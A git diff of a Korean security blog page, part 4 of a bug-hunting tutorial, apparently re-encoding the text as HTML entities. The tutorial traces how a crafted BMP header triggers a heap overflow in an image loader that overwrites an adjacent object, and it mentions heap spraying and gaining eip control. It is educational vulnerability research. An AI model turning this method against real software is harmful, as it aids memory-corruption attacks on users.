@@ -61,7 +61,7 @@
   <script src="/js/utils.js"></script>
   <script src="/js/color-schema.js"></script>
 
-<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/rss2.xml" title="hackyboiz" type="application/rss+xml">
+<meta name="generator" content="Hexo 5.1.1"><link rel="alternate" href="/rss2.xml" title="hackyboiz" type="application/rss+xml">
 </head>
 
 <body>
@@ -189,7 +189,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      2k 자
+      4.1k 자
     </span>
   
 
@@ -199,7 +199,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      40
+      82
        분
     </span>
   
@@ -240,68 +240,68 @@
               <script>
                    (adsbygoogle = window.adsbygoogle || []).push({});
               </script>
-              <p><a href="https://hackyboiz.github.io/2021/03/07/l0ch/bughunting-tutorial/">버그헌팅 튜토리얼 Part 1</a></p>
-<p><a href="https://hackyboiz.github.io/2021/03/17/l0ch/bughunting-tutorials-part2/">버그헌팅 튜토리얼 Part 2</a></p>
-<p><a href="https://hackyboiz.github.io/2021/03/24/l0ch/bughunting-tutorials-part3/">버그헌팅 튜토리얼 Part 3</a></p>
-<p>어느덧 버그헌팅 튜토리얼의 마지막 글입니다. Part 3 에서 바로 이어지는 내용이니 긴말 없이 바로 시작해볼게요!</p>
+              <p><a href="https://hackyboiz.github.io/2021/03/07/l0ch/bughunting-tutorial/">&#xBC84;&#xADF8;&#xD5CC;&#xD305; &#xD29C;&#xD1A0;&#xB9AC;&#xC5BC; Part 1</a></p>
+<p><a href="https://hackyboiz.github.io/2021/03/17/l0ch/bughunting-tutorials-part2/">&#xBC84;&#xADF8;&#xD5CC;&#xD305; &#xD29C;&#xD1A0;&#xB9AC;&#xC5BC; Part 2</a></p>
+<p><a href="https://hackyboiz.github.io/2021/03/24/l0ch/bughunting-tutorials-part3/">&#xBC84;&#xADF8;&#xD5CC;&#xD305; &#xD29C;&#xD1A0;&#xB9AC;&#xC5BC; Part 3</a></p>
+<p>&#xC5B4;&#xB290;&#xB367; &#xBC84;&#xADF8;&#xD5CC;&#xD305; &#xD29C;&#xD1A0;&#xB9AC;&#xC5BC;&#xC758; &#xB9C8;&#xC9C0;&#xB9C9; &#xAE00;&#xC785;&#xB2C8;&#xB2E4;. Part 3 &#xC5D0;&#xC11C; &#xBC14;&#xB85C; &#xC774;&#xC5B4;&#xC9C0;&#xB294; &#xB0B4;&#xC6A9;&#xC774;&#xB2C8; &#xAE34;&#xB9D0; &#xC5C6;&#xC774; &#xBC14;&#xB85C; &#xC2DC;&#xC791;&#xD574;&#xBCFC;&#xAC8C;&#xC694;!</p>
 <hr>
-<p>이제부터는 콜 스택을 복구해볼 겁니다. 콜 스택을 복구하면 우리가 어느 정도의 코드를 봐야 하는지 사이즈가 나옵니다. 이걸 복구하고 어느 부분부터 분석하면 좋을지를 판단할 겁니다.</p>
-<p>콜 스택을 복구하는 방법 역시 위에서 아래로(탑다운) 아래에서 위로(바텀업) 뭘 어떻게 하던 상관없습니다. 그냥 자신이 편하신 대로 하면 됩니다. 바텀업 방식으로 할 때에는 크래시가 발생하는 함수의 처음 부분에 브레이크 포인트를 걸어서 바로 직전의 리턴 어드레스를 보면서 하나하나 올라가면 됩니다. 탑다운 방식으로 할 경우 동적 디버깅과 정적 디버깅을 적절히 사용하면 됩니다. 일단 제일 위(라고 생각하는 함수)에 전달되는 인자를 보고 먼저 정적 리버싱을 진행합니다. 그리고 결과들을 기반으로 동적 디버깅을 같이 수행하면 됩니다.</p>
-<p>나는 아무 생각이 없다!!! 그냥 리버싱을 최대한 줄이고 싶어요!!! 시간은 많아요!!!(는 개뿔 제로데이는 묵히면 똥 됩니다)라고 하시는 분들은 그냥 제일 위에 있는 함수에서 p 누르고 크래시 터지면 프로그램 재시작하고 그 시점으로 가서 다시 p 누르고… 이렇게 쭉쭉 내려가는 방법도 있습니다. 무식하지만 확실하기도 하죠…. 는 시간 낭비 개쩔… 스레드 잘못 분석하면 리얼 시간 낭비… (스레드는 힙을 공유하기 때문에 여러 개의 스래드가 사용하는 힙에서 오버플로우가 발생하면 취약점이 존재하는 스레드 말고 다른 스레드에서도 크래시가 발생할 수 있습니다)ㅋㅋㅋㅋㅋㅋ 뭐 그래도 이것만큼 생각 없이 하는 건 없는 거 같네욬ㅋㅋㅋㅋㅋ (지극히 콜 스택 복구에만 해당되는 겁니다… 결국은 다 분석해야 돼요 ㅠㅠ)</p>
-<p>콜 스택을 복구하고 천천히 따라다가 보면 아래와 같이 <code>ImLoader+0x27BB0</code> 에서 헤더 검사를 진행하는 것을 발견할 수 있습니다. (캡처 사진의 헥스레이 코드는 아이다 버전에 따라 조금씩 다를 수 있습니다)</p>
+<p>&#xC774;&#xC81C;&#xBD80;&#xD130;&#xB294; &#xCF5C; &#xC2A4;&#xD0DD;&#xC744; &#xBCF5;&#xAD6C;&#xD574;&#xBCFC; &#xAC81;&#xB2C8;&#xB2E4;. &#xCF5C; &#xC2A4;&#xD0DD;&#xC744; &#xBCF5;&#xAD6C;&#xD558;&#xBA74; &#xC6B0;&#xB9AC;&#xAC00; &#xC5B4;&#xB290; &#xC815;&#xB3C4;&#xC758; &#xCF54;&#xB4DC;&#xB97C; &#xBD10;&#xC57C; &#xD558;&#xB294;&#xC9C0; &#xC0AC;&#xC774;&#xC988;&#xAC00; &#xB098;&#xC635;&#xB2C8;&#xB2E4;. &#xC774;&#xAC78; &#xBCF5;&#xAD6C;&#xD558;&#xACE0; &#xC5B4;&#xB290; &#xBD80;&#xBD84;&#xBD80;&#xD130; &#xBD84;&#xC11D;&#xD558;&#xBA74; &#xC88B;&#xC744;&#xC9C0;&#xB97C; &#xD310;&#xB2E8;&#xD560; &#xAC81;&#xB2C8;&#xB2E4;.</p>
+<p>&#xCF5C; &#xC2A4;&#xD0DD;&#xC744; &#xBCF5;&#xAD6C;&#xD558;&#xB294; &#xBC29;&#xBC95; &#xC5ED;&#xC2DC; &#xC704;&#xC5D0;&#xC11C; &#xC544;&#xB798;&#xB85C;(&#xD0D1;&#xB2E4;&#xC6B4;) &#xC544;&#xB798;&#xC5D0;&#xC11C; &#xC704;&#xB85C;(&#xBC14;&#xD140;&#xC5C5;) &#xBB58; &#xC5B4;&#xB5BB;&#xAC8C; &#xD558;&#xB358; &#xC0C1;&#xAD00;&#xC5C6;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB0E5; &#xC790;&#xC2E0;&#xC774; &#xD3B8;&#xD558;&#xC2E0; &#xB300;&#xB85C; &#xD558;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;. &#xBC14;&#xD140;&#xC5C5; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; &#xD560; &#xB54C;&#xC5D0;&#xB294; &#xD06C;&#xB798;&#xC2DC;&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xB294; &#xD568;&#xC218;&#xC758; &#xCC98;&#xC74C; &#xBD80;&#xBD84;&#xC5D0; &#xBE0C;&#xB808;&#xC774;&#xD06C; &#xD3EC;&#xC778;&#xD2B8;&#xB97C; &#xAC78;&#xC5B4;&#xC11C; &#xBC14;&#xB85C; &#xC9C1;&#xC804;&#xC758; &#xB9AC;&#xD134; &#xC5B4;&#xB4DC;&#xB808;&#xC2A4;&#xB97C; &#xBCF4;&#xBA74;&#xC11C; &#xD558;&#xB098;&#xD558;&#xB098; &#xC62C;&#xB77C;&#xAC00;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;. &#xD0D1;&#xB2E4;&#xC6B4; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; &#xD560; &#xACBD;&#xC6B0; &#xB3D9;&#xC801; &#xB514;&#xBC84;&#xAE45;&#xACFC; &#xC815;&#xC801; &#xB514;&#xBC84;&#xAE45;&#xC744; &#xC801;&#xC808;&#xD788; &#xC0AC;&#xC6A9;&#xD558;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;. &#xC77C;&#xB2E8; &#xC81C;&#xC77C; &#xC704;(&#xB77C;&#xACE0; &#xC0DD;&#xAC01;&#xD558;&#xB294; &#xD568;&#xC218;)&#xC5D0; &#xC804;&#xB2EC;&#xB418;&#xB294; &#xC778;&#xC790;&#xB97C; &#xBCF4;&#xACE0; &#xBA3C;&#xC800; &#xC815;&#xC801; &#xB9AC;&#xBC84;&#xC2F1;&#xC744; &#xC9C4;&#xD589;&#xD569;&#xB2C8;&#xB2E4;. &#xADF8;&#xB9AC;&#xACE0; &#xACB0;&#xACFC;&#xB4E4;&#xC744; &#xAE30;&#xBC18;&#xC73C;&#xB85C; &#xB3D9;&#xC801; &#xB514;&#xBC84;&#xAE45;&#xC744; &#xAC19;&#xC774; &#xC218;&#xD589;&#xD558;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;.</p>
+<p>&#xB098;&#xB294; &#xC544;&#xBB34; &#xC0DD;&#xAC01;&#xC774; &#xC5C6;&#xB2E4;!!! &#xADF8;&#xB0E5; &#xB9AC;&#xBC84;&#xC2F1;&#xC744; &#xCD5C;&#xB300;&#xD55C; &#xC904;&#xC774;&#xACE0; &#xC2F6;&#xC5B4;&#xC694;!!! &#xC2DC;&#xAC04;&#xC740; &#xB9CE;&#xC544;&#xC694;!!!(&#xB294; &#xAC1C;&#xBFD4; &#xC81C;&#xB85C;&#xB370;&#xC774;&#xB294; &#xBB35;&#xD788;&#xBA74; &#xB625; &#xB429;&#xB2C8;&#xB2E4;)&#xB77C;&#xACE0; &#xD558;&#xC2DC;&#xB294; &#xBD84;&#xB4E4;&#xC740; &#xADF8;&#xB0E5; &#xC81C;&#xC77C; &#xC704;&#xC5D0; &#xC788;&#xB294; &#xD568;&#xC218;&#xC5D0;&#xC11C; p &#xB204;&#xB974;&#xACE0; &#xD06C;&#xB798;&#xC2DC; &#xD130;&#xC9C0;&#xBA74; &#xD504;&#xB85C;&#xADF8;&#xB7A8; &#xC7AC;&#xC2DC;&#xC791;&#xD558;&#xACE0; &#xADF8; &#xC2DC;&#xC810;&#xC73C;&#xB85C; &#xAC00;&#xC11C; &#xB2E4;&#xC2DC; p &#xB204;&#xB974;&#xACE0;&#x2026; &#xC774;&#xB807;&#xAC8C; &#xCB49;&#xCB49; &#xB0B4;&#xB824;&#xAC00;&#xB294; &#xBC29;&#xBC95;&#xB3C4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xBB34;&#xC2DD;&#xD558;&#xC9C0;&#xB9CC; &#xD655;&#xC2E4;&#xD558;&#xAE30;&#xB3C4; &#xD558;&#xC8E0;&#x2026;. &#xB294; &#xC2DC;&#xAC04; &#xB0AD;&#xBE44; &#xAC1C;&#xCA54;&#x2026; &#xC2A4;&#xB808;&#xB4DC; &#xC798;&#xBABB; &#xBD84;&#xC11D;&#xD558;&#xBA74; &#xB9AC;&#xC5BC; &#xC2DC;&#xAC04; &#xB0AD;&#xBE44;&#x2026; (&#xC2A4;&#xB808;&#xB4DC;&#xB294; &#xD799;&#xC744; &#xACF5;&#xC720;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC5EC;&#xB7EC; &#xAC1C;&#xC758; &#xC2A4;&#xB798;&#xB4DC;&#xAC00; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xD799;&#xC5D0;&#xC11C; &#xC624;&#xBC84;&#xD50C;&#xB85C;&#xC6B0;&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xBA74; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xC874;&#xC7AC;&#xD558;&#xB294; &#xC2A4;&#xB808;&#xB4DC; &#xB9D0;&#xACE0; &#xB2E4;&#xB978; &#xC2A4;&#xB808;&#xB4DC;&#xC5D0;&#xC11C;&#xB3C4; &#xD06C;&#xB798;&#xC2DC;&#xAC00; &#xBC1C;&#xC0DD;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;)&#x314B;&#x314B;&#x314B;&#x314B;&#x314B;&#x314B; &#xBB50; &#xADF8;&#xB798;&#xB3C4; &#xC774;&#xAC83;&#xB9CC;&#xD07C; &#xC0DD;&#xAC01; &#xC5C6;&#xC774; &#xD558;&#xB294; &#xAC74; &#xC5C6;&#xB294; &#xAC70; &#xAC19;&#xB124;&#xC6AC;&#x314B;&#x314B;&#x314B;&#x314B;&#x314B; (&#xC9C0;&#xADF9;&#xD788; &#xCF5C; &#xC2A4;&#xD0DD; &#xBCF5;&#xAD6C;&#xC5D0;&#xB9CC; &#xD574;&#xB2F9;&#xB418;&#xB294; &#xAC81;&#xB2C8;&#xB2E4;&#x2026; &#xACB0;&#xAD6D;&#xC740; &#xB2E4; &#xBD84;&#xC11D;&#xD574;&#xC57C; &#xB3FC;&#xC694; &#x3160;&#x3160;)</p>
+<p>&#xCF5C; &#xC2A4;&#xD0DD;&#xC744; &#xBCF5;&#xAD6C;&#xD558;&#xACE0; &#xCC9C;&#xCC9C;&#xD788; &#xB530;&#xB77C;&#xB2E4;&#xAC00; &#xBCF4;&#xBA74; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; <code>ImLoader+0x27BB0</code> &#xC5D0;&#xC11C; &#xD5E4;&#xB354; &#xAC80;&#xC0AC;&#xB97C; &#xC9C4;&#xD589;&#xD558;&#xB294; &#xAC83;&#xC744; &#xBC1C;&#xACAC;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. (&#xCEA1;&#xCC98; &#xC0AC;&#xC9C4;&#xC758; &#xD5E5;&#xC2A4;&#xB808;&#xC774; &#xCF54;&#xB4DC;&#xB294; &#xC544;&#xC774;&#xB2E4; &#xBC84;&#xC804;&#xC5D0; &#xB530;&#xB77C; &#xC870;&#xAE08;&#xC529; &#xB2E4;&#xB97C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;)</p>
 <p><img src="/2021/03/31/l0ch/bughunting-tutorials-part4/image--048.png" srcset="/img/loading.gif" alt="bughunting-tutorials-part4/image--048.png"></p>
-<p><code>v7</code>에 있는 값이 <code>MB</code>(숫자로 되어 있어서 앞에서 못 찾은 거네요)인지 비교하고 틀리면 익셉션을 발생시키고 맞다면 해석을 진행하게 됩니다. 그럼 <code>sub_427620</code> 에서 파일 해석을 진행하면서 크래시가 발생하겠네요!!</p>
-<p>그럼 이제부터는 실제 파일을 처리하는 함수가 어떻게 진행되는지 알아볼게요.</p>
+<p><code>v7</code>&#xC5D0; &#xC788;&#xB294; &#xAC12;&#xC774; <code>MB</code>(&#xC22B;&#xC790;&#xB85C; &#xB418;&#xC5B4; &#xC788;&#xC5B4;&#xC11C; &#xC55E;&#xC5D0;&#xC11C; &#xBABB; &#xCC3E;&#xC740; &#xAC70;&#xB124;&#xC694;)&#xC778;&#xC9C0; &#xBE44;&#xAD50;&#xD558;&#xACE0; &#xD2C0;&#xB9AC;&#xBA74; &#xC775;&#xC149;&#xC158;&#xC744; &#xBC1C;&#xC0DD;&#xC2DC;&#xD0A4;&#xACE0; &#xB9DE;&#xB2E4;&#xBA74; &#xD574;&#xC11D;&#xC744; &#xC9C4;&#xD589;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7FC; <code>sub_427620</code> &#xC5D0;&#xC11C; &#xD30C;&#xC77C; &#xD574;&#xC11D;&#xC744; &#xC9C4;&#xD589;&#xD558;&#xBA74;&#xC11C; &#xD06C;&#xB798;&#xC2DC;&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xACA0;&#xB124;&#xC694;!!</p>
+<p>&#xADF8;&#xB7FC; &#xC774;&#xC81C;&#xBD80;&#xD130;&#xB294; &#xC2E4;&#xC81C; &#xD30C;&#xC77C;&#xC744; &#xCC98;&#xB9AC;&#xD558;&#xB294; &#xD568;&#xC218;&#xAC00; &#xC5B4;&#xB5BB;&#xAC8C; &#xC9C4;&#xD589;&#xB418;&#xB294;&#xC9C0; &#xC54C;&#xC544;&#xBCFC;&#xAC8C;&#xC694;.</p>
 <p><img src="/2021/03/31/l0ch/bughunting-tutorials-part4/image--050.jpg" srcset="/img/loading.gif" alt="bughunting-tutorials-part4/image--050.jpg"></p>
-<p>먼저 파라미터로 전달되어 온 Stream 값을 통해 <code>BITMAPINFOHEADER</code> 의 사이즈를 가져와서 지역변수에 저장해줍니다. 그럼 당연히 우리가 수정한 <code>0x1f28</code> 이겠죠? 그런 다음 <code>0x1f28+0x40c</code> 만큼 <code>BITMAPINFOHEADER</code> 를 저장하기 위한 메모리를 할당해주고 해당 주소를 header에 저장해줍니다. 그리고 <code>size</code> 와 <code>0xc</code> 가 같은 지 비교를 해서 결과 값을 <code>size_bool</code> 에 저장합니다. 이때 <code>size</code> 는 <code>0x1f28</code> 이기 때문에 <code>size_bool</code>에는 0 이 저장됩니다. 따라서 밑에 분기점에서 <code>size_bool</code> 이 <code>0</code> 이기 때문에 <code>else</code>로 빠지게 됩니다.</p>
+<p>&#xBA3C;&#xC800; &#xD30C;&#xB77C;&#xBBF8;&#xD130;&#xB85C; &#xC804;&#xB2EC;&#xB418;&#xC5B4; &#xC628; Stream &#xAC12;&#xC744; &#xD1B5;&#xD574; <code>BITMAPINFOHEADER</code> &#xC758; &#xC0AC;&#xC774;&#xC988;&#xB97C; &#xAC00;&#xC838;&#xC640;&#xC11C; &#xC9C0;&#xC5ED;&#xBCC0;&#xC218;&#xC5D0; &#xC800;&#xC7A5;&#xD574;&#xC90D;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7FC; &#xB2F9;&#xC5F0;&#xD788; &#xC6B0;&#xB9AC;&#xAC00; &#xC218;&#xC815;&#xD55C; <code>0x1f28</code> &#xC774;&#xACA0;&#xC8E0;? &#xADF8;&#xB7F0; &#xB2E4;&#xC74C; <code>0x1f28+0x40c</code> &#xB9CC;&#xD07C; <code>BITMAPINFOHEADER</code> &#xB97C; &#xC800;&#xC7A5;&#xD558;&#xAE30; &#xC704;&#xD55C; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xD560;&#xB2F9;&#xD574;&#xC8FC;&#xACE0; &#xD574;&#xB2F9; &#xC8FC;&#xC18C;&#xB97C; header&#xC5D0; &#xC800;&#xC7A5;&#xD574;&#xC90D;&#xB2C8;&#xB2E4;. &#xADF8;&#xB9AC;&#xACE0; <code>size</code> &#xC640; <code>0xc</code> &#xAC00; &#xAC19;&#xC740; &#xC9C0; &#xBE44;&#xAD50;&#xB97C; &#xD574;&#xC11C; &#xACB0;&#xACFC; &#xAC12;&#xC744; <code>size_bool</code> &#xC5D0; &#xC800;&#xC7A5;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB54C; <code>size</code> &#xB294; <code>0x1f28</code> &#xC774;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; <code>size_bool</code>&#xC5D0;&#xB294; 0 &#xC774; &#xC800;&#xC7A5;&#xB429;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; &#xBC11;&#xC5D0; &#xBD84;&#xAE30;&#xC810;&#xC5D0;&#xC11C; <code>size_bool</code> &#xC774; <code>0</code> &#xC774;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; <code>else</code>&#xB85C; &#xBE60;&#xC9C0;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p>
 <p><img src="/2021/03/31/l0ch/bughunting-tutorials-part4/image--052.png" srcset="/img/loading.gif" alt="bughunting-tutorials-part4/image--052.png"></p>
-<p><code>else</code>로 빠지게 되면 파일의 <code>BITMAPINFOHEADER</code> 시작 부분부터 <code>size</code>만큼 읽어와서 header에 저장하게 됩니다. 앞에서 <code>size+0x40c</code> 만큼 할당을 했기 때문에 오버플로우가 발생할 수 없습니다. </p>
-<p>그런 다음, compression에 대한 분기문을 만나게 됩니다. 이 값은 <code>0x00</code> 에서 <code>0xa00</code>으로 수정했기 때문에 해당 분기로 들어갈 수 있게 됩니다. 분기로 들어가면 첫 번째로 하는 일이 오브젝트를 할당하네요. 그럼 <code>BITMAPINFOHEADER</code> 가 할당된 뒷부분에 할당이 되겠네요.(<code>BITMAPINFOHEADER</code> 가 페이지를 하나 더 할당할 만큼 크질 않으니) 이 부분이 중요합니다!!! 왜냐하면 우리가 덮게 될 객체니까요 ㅎㅎ(응? <code>BITMAPINFOHEADER</code>뒤에 할당된다며… 오버플로우 안 난다며….)</p>
-<p>뒤에 더 보도록 하죠 ㅎㅎㅎㅎ</p>
+<p><code>else</code>&#xB85C; &#xBE60;&#xC9C0;&#xAC8C; &#xB418;&#xBA74; &#xD30C;&#xC77C;&#xC758; <code>BITMAPINFOHEADER</code> &#xC2DC;&#xC791; &#xBD80;&#xBD84;&#xBD80;&#xD130; <code>size</code>&#xB9CC;&#xD07C; &#xC77D;&#xC5B4;&#xC640;&#xC11C; header&#xC5D0; &#xC800;&#xC7A5;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;. &#xC55E;&#xC5D0;&#xC11C; <code>size+0x40c</code> &#xB9CC;&#xD07C; &#xD560;&#xB2F9;&#xC744; &#xD588;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC624;&#xBC84;&#xD50C;&#xB85C;&#xC6B0;&#xAC00; &#xBC1C;&#xC0DD;&#xD560; &#xC218; &#xC5C6;&#xC2B5;&#xB2C8;&#xB2E4;. </p>
+<p>&#xADF8;&#xB7F0; &#xB2E4;&#xC74C;, compression&#xC5D0; &#xB300;&#xD55C; &#xBD84;&#xAE30;&#xBB38;&#xC744; &#xB9CC;&#xB098;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;. &#xC774; &#xAC12;&#xC740; <code>0x00</code> &#xC5D0;&#xC11C; <code>0xa00</code>&#xC73C;&#xB85C; &#xC218;&#xC815;&#xD588;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xD574;&#xB2F9; &#xBD84;&#xAE30;&#xB85C; &#xB4E4;&#xC5B4;&#xAC08; &#xC218; &#xC788;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;. &#xBD84;&#xAE30;&#xB85C; &#xB4E4;&#xC5B4;&#xAC00;&#xBA74; &#xCCAB; &#xBC88;&#xC9F8;&#xB85C; &#xD558;&#xB294; &#xC77C;&#xC774; &#xC624;&#xBE0C;&#xC81D;&#xD2B8;&#xB97C; &#xD560;&#xB2F9;&#xD558;&#xB124;&#xC694;. &#xADF8;&#xB7FC; <code>BITMAPINFOHEADER</code> &#xAC00; &#xD560;&#xB2F9;&#xB41C; &#xB4B7;&#xBD80;&#xBD84;&#xC5D0; &#xD560;&#xB2F9;&#xC774; &#xB418;&#xACA0;&#xB124;&#xC694;.(<code>BITMAPINFOHEADER</code> &#xAC00; &#xD398;&#xC774;&#xC9C0;&#xB97C; &#xD558;&#xB098; &#xB354; &#xD560;&#xB2F9;&#xD560; &#xB9CC;&#xD07C; &#xD06C;&#xC9C8; &#xC54A;&#xC73C;&#xB2C8;) &#xC774; &#xBD80;&#xBD84;&#xC774; &#xC911;&#xC694;&#xD569;&#xB2C8;&#xB2E4;!!! &#xC65C;&#xB0D0;&#xD558;&#xBA74; &#xC6B0;&#xB9AC;&#xAC00; &#xB36E;&#xAC8C; &#xB420; &#xAC1D;&#xCCB4;&#xB2C8;&#xAE4C;&#xC694; &#x314E;&#x314E;(&#xC751;? <code>BITMAPINFOHEADER</code>&#xB4A4;&#xC5D0; &#xD560;&#xB2F9;&#xB41C;&#xB2E4;&#xBA70;&#x2026; &#xC624;&#xBC84;&#xD50C;&#xB85C;&#xC6B0; &#xC548; &#xB09C;&#xB2E4;&#xBA70;&#x2026;.)</p>
+<p>&#xB4A4;&#xC5D0; &#xB354; &#xBCF4;&#xB3C4;&#xB85D; &#xD558;&#xC8E0; &#x314E;&#x314E;&#x314E;&#x314E;</p>
 <p><img src="/2021/03/31/l0ch/bughunting-tutorials-part4/image--054.jpg" srcset="/img/loading.gif" alt="bughunting-tutorials-part4/image--054.jpg"></p>
-<p>이제는 <code>this</code> 에 <code>BITMAPINFOHEADER</code> 정보를 저장합니다. 참 찰지게 다 넣네요.<br>그리고 마지막에는 모든 비트맵 데이터를 저장합니다. 우리는 익스플로잇을 할 때 이 부분을 이용해서 스프레이를 할 수 있습니다 ㅎㅎ</p>
+<p>&#xC774;&#xC81C;&#xB294; <code>this</code> &#xC5D0; <code>BITMAPINFOHEADER</code> &#xC815;&#xBCF4;&#xB97C; &#xC800;&#xC7A5;&#xD569;&#xB2C8;&#xB2E4;. &#xCC38; &#xCC30;&#xC9C0;&#xAC8C; &#xB2E4; &#xB123;&#xB124;&#xC694;.<br>&#xADF8;&#xB9AC;&#xACE0; &#xB9C8;&#xC9C0;&#xB9C9;&#xC5D0;&#xB294; &#xBAA8;&#xB4E0; &#xBE44;&#xD2B8;&#xB9F5; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC800;&#xC7A5;&#xD569;&#xB2C8;&#xB2E4;. &#xC6B0;&#xB9AC;&#xB294; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787;&#xC744; &#xD560; &#xB54C; &#xC774; &#xBD80;&#xBD84;&#xC744; &#xC774;&#xC6A9;&#xD574;&#xC11C; &#xC2A4;&#xD504;&#xB808;&#xC774;&#xB97C; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4; &#x314E;&#x314E;</p>
 <p><img src="/2021/03/31/l0ch/bughunting-tutorials-part4/image--056.jpg" srcset="/img/loading.gif" alt="bughunting-tutorials-part4/image--056.jpg"></p>
-<p>이제 취약점 부분입니다 ㅎㅎㅎ 드디어 ㅎㅎ</p>
-<p>먼저 어떤 주소를 계산합니다. Header 주소 기준으로 <code>size</code> 만큼 뒤에 주소를 저장합니다. 그런 다음 밑에 모든 분기를 건너뛰고 <code>sub_41AAF0</code> 함수로 갑니다. 이 함수는 파일 스트림에서 <code>byte_4BA6F4[size_bool] * header-&gt;biClrUsed = 0x800</code> 만큼 읽어서 위에서 계산한 주소에 저장합니다.</p>
-<p>여기에서 오버플로우가 발생합니다!!!! 아까 위에서 얘기했듯이 header 의 크기는 <code>size+0x40c</code>입니다 ㅋㅋㅋ 근데 여기에서는 <code>header+size</code> 에 <code>0x800</code> 바이트를 할당하니 뒤에 있는 객체를 덮게 되는 거죠!! 그럼 객체가 덮이기 전과 후를 한번 살펴볼게요!!</p>
+<p>&#xC774;&#xC81C; &#xCDE8;&#xC57D;&#xC810; &#xBD80;&#xBD84;&#xC785;&#xB2C8;&#xB2E4; &#x314E;&#x314E;&#x314E; &#xB4DC;&#xB514;&#xC5B4; &#x314E;&#x314E;</p>
+<p>&#xBA3C;&#xC800; &#xC5B4;&#xB5A4; &#xC8FC;&#xC18C;&#xB97C; &#xACC4;&#xC0B0;&#xD569;&#xB2C8;&#xB2E4;. Header &#xC8FC;&#xC18C; &#xAE30;&#xC900;&#xC73C;&#xB85C; <code>size</code> &#xB9CC;&#xD07C; &#xB4A4;&#xC5D0; &#xC8FC;&#xC18C;&#xB97C; &#xC800;&#xC7A5;&#xD569;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7F0; &#xB2E4;&#xC74C; &#xBC11;&#xC5D0; &#xBAA8;&#xB4E0; &#xBD84;&#xAE30;&#xB97C; &#xAC74;&#xB108;&#xB6F0;&#xACE0; <code>sub_41AAF0</code> &#xD568;&#xC218;&#xB85C; &#xAC11;&#xB2C8;&#xB2E4;. &#xC774; &#xD568;&#xC218;&#xB294; &#xD30C;&#xC77C; &#xC2A4;&#xD2B8;&#xB9BC;&#xC5D0;&#xC11C; <code>byte_4BA6F4[size_bool] * header-&gt;biClrUsed = 0x800</code> &#xB9CC;&#xD07C; &#xC77D;&#xC5B4;&#xC11C; &#xC704;&#xC5D0;&#xC11C; &#xACC4;&#xC0B0;&#xD55C; &#xC8FC;&#xC18C;&#xC5D0; &#xC800;&#xC7A5;&#xD569;&#xB2C8;&#xB2E4;.</p>
+<p>&#xC5EC;&#xAE30;&#xC5D0;&#xC11C; &#xC624;&#xBC84;&#xD50C;&#xB85C;&#xC6B0;&#xAC00; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;!!!! &#xC544;&#xAE4C; &#xC704;&#xC5D0;&#xC11C; &#xC598;&#xAE30;&#xD588;&#xB4EF;&#xC774; header &#xC758; &#xD06C;&#xAE30;&#xB294; <code>size+0x40c</code>&#xC785;&#xB2C8;&#xB2E4; &#x314B;&#x314B;&#x314B; &#xADFC;&#xB370; &#xC5EC;&#xAE30;&#xC5D0;&#xC11C;&#xB294; <code>header+size</code> &#xC5D0; <code>0x800</code> &#xBC14;&#xC774;&#xD2B8;&#xB97C; &#xD560;&#xB2F9;&#xD558;&#xB2C8; &#xB4A4;&#xC5D0; &#xC788;&#xB294; &#xAC1D;&#xCCB4;&#xB97C; &#xB36E;&#xAC8C; &#xB418;&#xB294; &#xAC70;&#xC8E0;!! &#xADF8;&#xB7FC; &#xAC1D;&#xCCB4;&#xAC00; &#xB36E;&#xC774;&#xAE30; &#xC804;&#xACFC; &#xD6C4;&#xB97C; &#xD55C;&#xBC88; &#xC0B4;&#xD3B4;&#xBCFC;&#xAC8C;&#xC694;!!</p>
 <p>Before:</p>
 <p><img src="/2021/03/31/l0ch/bughunting-tutorials-part4/image--058.png" srcset="/img/loading.gif" alt="bughunting-tutorials-part4/image--058.png"></p>
 <p>After:</p>
 <p><img src="/2021/03/31/l0ch/bughunting-tutorials-part4/image--060.png" srcset="/img/loading.gif" alt="bughunting-tutorials-part4/image--060.png"></p>
-<p>헤헿 자 이제 그럼 <code>eip</code>를 잡을 수 있겠네요!!!</p>
